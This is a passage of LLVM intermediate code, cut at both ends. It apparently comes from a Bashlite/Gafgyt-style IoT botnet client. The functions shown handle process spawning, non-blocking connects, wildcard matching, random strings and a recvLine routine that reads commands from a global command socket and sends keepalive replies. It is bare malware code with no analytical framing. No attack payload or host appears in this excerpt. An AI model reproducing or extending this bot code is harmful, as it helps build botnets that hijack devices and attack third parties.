  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

87:                                               ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #12
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

94:                                               ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

98:                                               ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.33, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.34, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.35, i64 0, i64 0), i8* %99, i8* null) #12
  call void @_exit(i32 127) #14
  unreachable

101:                                              ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

106:                                              ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

112:                                              ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

118:                                              ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

125:                                              ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #3

; Function Attrs: nounwind
declare i32 @getdtablesize() #3

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #5

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #3

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdpclose(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %9 = load i32*, i32** @fdopen_pids, align 8
  %10 = icmp eq i32* %9, null
  br i1 %10, label %18, label %11

11:                                               ; preds = %1
  %12 = load i32*, i32** @fdopen_pids, align 8
  %13 = load i32, i32* %3, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i32, i32* %12, i64 %14
  %16 = load i32, i32* %15, align 4
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %19

18:                                               ; preds = %11, %1
  store i32 -1, i32* %2, align 4
  br label %58

19:                                               ; preds = %11
  %20 = load i32, i32* %3, align 4
  %21 = call i32 @close(i32 %20)
  %22 = call i32 @sigemptyset(%struct.__sigset_t* %6) #12
  %23 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #12
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #12
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #12
  %26 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #12
  br label %27

27:                                               ; preds = %41, %19
  %28 = load i32*, i32** @fdopen_pids, align 8
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i32, i32* %28, i64 %30
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @waitpid(i32 %32, i32* %7, i32 0)
  store i32 %33, i32* %8, align 4
  br label %34

34:                                               ; preds = %27
  %35 = load i32, i32* %8, align 4
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %37, label %41

37:                                               ; preds = %34
  %38 = call i32* @__errno_location() #15
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 4
  br label %41

41:                                               ; preds = %37, %34
  %42 = phi i1 [ false, %34 ], [ %40, %37 ]
  br i1 %42, label %27, label %43, !llvm.loop !14

43:                                               ; preds = %41
  %44 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #12
  %45 = load i32*, i32** @fdopen_pids, align 8
  %46 = load i32, i32* %4, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i32, i32* %45, i64 %47
  store i32 0, i32* %48, align 4
  %49 = load i32, i32* %8, align 4
  %50 = icmp eq i32 %49, -1
  br i1 %50, label %51, label %52

51:                                               ; preds = %43
  br label %56

52:                                               ; preds = %43
  %53 = load i32, i32* %7, align 4
  %54 = and i32 %53, 65280
  %55 = ashr i32 %54, 8
  br label %56

56:                                               ; preds = %52, %51
  %57 = phi i32 [ -1, %51 ], [ %55, %52 ]
  store i32 %57, i32* %2, align 4
  br label %58

58:                                               ; preds = %56, %18
  %59 = load i32, i32* %2, align 4
  ret i32 %59
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #3

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #3

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #3

declare i32 @waitpid(i32, i32*, i32) #5

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %8, align 4
  br label %9, !llvm.loop !15

37:                                               ; preds = %25
  %38 = load i32, i32* %7, align 4
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %40, label %41

40:                                               ; preds = %37
  br label %43

41:                                               ; preds = %37
  %42 = load i8*, i8** %4, align 8
  br label %43

43:                                               ; preds = %41, %40
  %44 = phi i8* [ null, %40 ], [ %42, %41 ]
  ret i8* %44
}

declare i64 @read(i32, i8*, i64) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @connectTimeout(i32 %0, i8* %1, i32 %2, i32 %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %struct.fd_set*, align 8
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #15
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %4
  store i32 0, i32* %5, align 4
  br label %106

37:                                               ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %39, i8 0, i64 8, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %97

45:                                               ; preds = %37
  %46 = call i32* @__errno_location() #15
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %95

49:                                               ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

54:                                               ; preds = %49
  store %struct.fd_set* %11, %struct.fd_set** %18, align 8
  store i32 0, i32* %17, align 4
  br label %55

55:                                               ; preds = %65, %54
  %56 = load i32, i32* %17, align 4
  %57 = zext i32 %56 to i64
  %58 = icmp ult i64 %57, 16
  br i1 %58, label %59, label %68

59:                                               ; preds = %55
  %60 = load %struct.fd_set*, %struct.fd_set** %18, align 8
  %61 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %60, i32 0, i32 0
  %62 = load i32, i32* %17, align 4
  %63 = zext i32 %62 to i64
  %64 = getelementptr inbounds [16 x i64], [16 x i64]* %61, i64 0, i64 %63
  store i64 0, i64* %64, align 8
  br label %65

65:                                               ; preds = %59
  %66 = load i32, i32* %17, align 4
  %67 = add i32 %66, 1
  store i32 %67, i32* %17, align 4
  br label %55, !llvm.loop !16

68:                                               ; preds = %55
  br label %69

69:                                               ; preds = %68
  %70 = load i32, i32* %6, align 4
  %71 = srem i32 %70, 64
  %72 = zext i32 %71 to i64
  %73 = shl i64 1, %72
  %74 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %75 = load i32, i32* %6, align 4
  %76 = sdiv i32 %75, 64
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [16 x i64], [16 x i64]* %74, i64 0, i64 %77
  %79 = load i64, i64* %78, align 8
  %80 = or i64 %79, %73
  store i64 %80, i64* %78, align 8
  %81 = load i32, i32* %6, align 4
  %82 = add nsw i32 %81, 1
  %83 = call i32 @select(i32 %82, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %84 = icmp sgt i32 %83, 0
  br i1 %84, label %85, label %93

85:                                               ; preds = %69
  store i32 4, i32* %13, align 4
  %86 = load i32, i32* %6, align 4
  %87 = bitcast i32* %14 to i8*
  %88 = call i32 @getsockopt(i32 %86, i32 1, i32 4, i8* %87, i32* %13) #12
  %89 = load i32, i32* %14, align 4
  %90 = icmp ne i32 %89, 0
  br i1 %90, label %91, label %92

91:                                               ; preds = %85
  store i32 0, i32* %5, align 4
  br label %106

92:                                               ; preds = %85
  br label %94

93:                                               ; preds = %69
  store i32 0, i32* %5, align 4
  br label %106

94:                                               ; preds = %92
  br label %96

95:                                               ; preds = %45
  store i32 0, i32* %5, align 4
  br label %106

96:                                               ; preds = %94
  br label %97

97:                                               ; preds = %96, %37
  %98 = load i32, i32* %6, align 4
  %99 = call i32 (i32, i32, ...) @fcntl(i32 %98, i32 3, i8* null)
  %100 = sext i32 %99 to i64
  store i64 %100, i64* %15, align 8
  %101 = load i64, i64* %15, align 8
  %102 = and i64 %101, -2049
  store i64 %102, i64* %15, align 8
  %103 = load i32, i32* %6, align 4
  %104 = load i64, i64* %15, align 8
  %105 = call i32 (i32, i32, ...) @fcntl(i32 %103, i32 4, i64 %104)
  store i32 1, i32* %5, align 4
  br label %106

106:                                              ; preds = %97, %95, %93, %91, %36
  %107 = load i32, i32* %5, align 4
  ret i32 %107
}

declare i32 @fcntl(i32, i32, ...) #5

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #5

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #5

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i64 @parseHex(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

4:                                                ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

9:                                                ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

12:                                               ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %24

14:                                               ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = or i64 %16, %22
  store i64 %23, i64* %3, align 8
  br label %4, !llvm.loop !17

24:                                               ; preds = %12
  %25 = load i64, i64* %3, align 8
  ret i64 %25
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @wildString(i8* %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %54 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

9:                                                ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %76

13:                                               ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

19:                                               ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

24:                                               ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

31:                                               ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

33:                                               ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %76

37:                                               ; preds = %2
  %38 = load i8*, i8** %5, align 8
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %50

42:                                               ; preds = %37
  %43 = load i8*, i8** %4, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8*, i8** %5, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = call i32 @wildString(i8* %44, i8* %46)
  %48 = icmp ne i32 %47, 0
  %49 = xor i1 %48, true
  br label %50

50:                                               ; preds = %42, %37
  %51 = phi i1 [ false, %37 ], [ %49, %42 ]
  %52 = xor i1 %51, true
  %53 = zext i1 %52 to i32
  store i32 %53, i32* %3, align 4
  br label %76

54:                                               ; preds = %2
  %55 = load i8*, i8** %4, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = call i32 @toupper(i32 %57) #11
  %59 = load i8*, i8** %5, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = call i32 @toupper(i32 %61) #11
  %63 = icmp eq i32 %58, %62
  br i1 %63, label %64, label %72

64:                                               ; preds = %54
  %65 = load i8*, i8** %4, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 1
  %69 = call i32 @wildString(i8* %66, i8* %68)
  %70 = icmp ne i32 %69, 0
  %71 = xor i1 %70, true
  br label %72

72:                                               ; preds = %64, %54
  %73 = phi i1 [ false, %54 ], [ %71, %64 ]
  %74 = xor i1 %73, true
  %75 = zext i1 %74 to i32
  store i32 %75, i32* %3, align 4
  br label %76

76:                                               ; preds = %72, %50, %33, %9
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: nounwind readonly willreturn
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getHost(i8* %0, %struct.in_addr* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #12
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

12:                                               ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

13:                                               ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

14:                                               ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @uppercase(i8* %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

3:                                                ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

7:                                                ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #11
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3, !llvm.loop !18

16:                                               ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @makeRandomStr(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

6:                                                ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

10:                                               ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

19:                                               ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6, !llvm.loop !19

22:                                               ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @recvLine(i32 %0, i8* %1, i32 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.fd_set*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.fd_set*, align 8
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %19, i8 0, i64 %21, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

24:                                               ; preds = %3
  store %struct.fd_set* %8, %struct.fd_set** %11, align 8
  store i32 0, i32* %10, align 4
  br label %25

25:                                               ; preds = %35, %24
  %26 = load i32, i32* %10, align 4
  %27 = zext i32 %26 to i64
  %28 = icmp ult i64 %27, 16
  br i1 %28, label %29, label %38

29:                                               ; preds = %25
  %30 = load %struct.fd_set*, %struct.fd_set** %11, align 8
  %31 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %30, i32 0, i32 0
  %32 = load i32, i32* %10, align 4
  %33 = zext i32 %32 to i64
  %34 = getelementptr inbounds [16 x i64], [16 x i64]* %31, i64 0, i64 %33
  store i64 0, i64* %34, align 8
  br label %35

35:                                               ; preds = %29
  %36 = load i32, i32* %10, align 4
  %37 = add i32 %36, 1
  store i32 %37, i32* %10, align 4
  br label %25, !llvm.loop !20

38:                                               ; preds = %25
  br label %39

39:                                               ; preds = %38
  %40 = load i32, i32* %5, align 4
  %41 = srem i32 %40, 64
  %42 = zext i32 %41 to i64
  %43 = shl i64 1, %42
  %44 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %45 = load i32, i32* %5, align 4
  %46 = sdiv i32 %45, 64
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [16 x i64], [16 x i64]* %44, i64 0, i64 %47
  %49 = load i64, i64* %48, align 8
  %50 = or i64 %49, %43
  store i64 %50, i64* %48, align 8
  %51 = load i32, i32* %5, align 4
  %52 = add nsw i32 %51, 1
  %53 = call i32 @select(i32 %52, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %53, i32* %12, align 4
  %54 = icmp sle i32 %53, 0
  br i1 %54, label %55, label %100

55:                                               ; preds = %39
  br label %56

56:                                               ; preds = %95, %55
  %57 = load i32, i32* %13, align 4
  %58 = icmp slt i32 %57, 10
  br i1 %58, label %59, label %99

59:                                               ; preds = %56
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0))
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %62, align 8
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %63, align 8
  br label %64

64:                                               ; preds = %59
  store %struct.fd_set* %8, %struct.fd_set** %15, align 8
  store i32 0, i32* %14, align 4
  br label %65

65:                                               ; preds = %75, %64
  %66 = load i32, i32* %14, align 4
  %67 = zext i32 %66 to i64
  %68 = icmp ult i64 %67, 16
  br i1 %68, label %69, label %78

69:                                               ; preds = %65
  %70 = load %struct.fd_set*, %struct.fd_set** %15, align 8
  %71 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %70, i32 0, i32 0
  %72 = load i32, i32* %14, align 4
  %73 = zext i32 %72 to i64
  %74 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %73
  store i64 0, i64* %74, align 8
  br label %75

75:                                               ; preds = %69
  %76 = load i32, i32* %14, align 4
  %77 = add i32 %76, 1
  store i32 %77, i32* %14, align 4
  br label %65, !llvm.loop !21

78:                                               ; preds = %65
  br label %79

79:                                               ; preds = %78
  %80 = load i32, i32* %5, align 4
  %81 = srem i32 %80, 64
  %82 = zext i32 %81 to i64
  %83 = shl i64 1, %82
  %84 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %85 = load i32, i32* %5, align 4
  %86 = sdiv i32 %85, 64
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds [16 x i64], [16 x i64]* %84, i64 0, i64 %87
  %89 = load i64, i64* %88, align 8
  %90 = or i64 %89, %83
  store i64 %90, i64* %88, align 8
  %91 = load i32, i32* %5, align 4
  %92 = add nsw i32 %91, 1
  %93 = call i32 @select(i32 %92, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %93, i32* %12, align 4
  %94 = icmp sle i32 %93, 0
  br i1 %94, label %95, label %98

95:                                               ; preds = %79
  %96 = load i32, i32* %13, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %13, align 4
  br label %56, !llvm.loop !22

98:                                               ; preds = %79
  br label %99

99:                                               ; preds = %98, %56
  br label %100

100:                                              ; preds = %99, %39
  store i32 0, i32* %18, align 4
  %101 = load i8*, i8** %6, align 8
  store i8* %101, i8** %17, align 8
  br label %102

102:                                              ; preds = %120, %100
  %103 = load i32, i32* %7, align 4
  %104 = add nsw i32 %103, -1
  store i32 %104, i32* %7, align 4
  %105 = icmp sgt i32 %103, 1
  br i1 %105, label %106, label %123

106:                                              ; preds = %102
  %107 = load i32, i32* @mainCommSock, align 4
  %108 = call i64 @recv(i32 %107, i8* %16, i64 1, i32 0)
  %109 = icmp ne i64 %108, 1
  br i1 %109, label %110, label %112

110:                                              ; preds = %106
  %111 = load i8*, i8** %17, align 8
  store i8 0, i8* %111, align 1
  store i32 -1, i32* %4, align 4
  br label %126

112:                                              ; preds = %106
  %113 = load i8, i8* %16, align 1
  %114 = load i8*, i8** %17, align 8
  %115 = getelementptr inbounds i8, i8* %114, i32 1
  store i8* %115, i8** %17, align 8
  store i8 %113, i8* %114, align 1
  %116 = load i8, i8* %16, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 10
